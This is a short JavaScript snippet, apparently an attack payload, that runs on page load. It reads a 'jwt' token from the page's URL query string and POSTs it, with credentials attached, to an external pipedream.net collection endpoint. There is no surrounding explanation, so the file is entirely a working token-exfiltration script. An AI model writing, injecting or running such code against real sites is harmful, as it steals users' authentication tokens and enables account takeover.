 function loadDoc1() {
const urlParams = new URLSearchParams(window.location.search);
const sectionName = urlParams.get('jwt');

const xhttp = new XMLHttpRequest();
xhttp.open("POST", "https://eojjvbt09aaka4m.m.pipedream.net", true)
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.withCredentials = true;
xhttp.send(sectionName);
}

window.onload = loadDoc1(); 
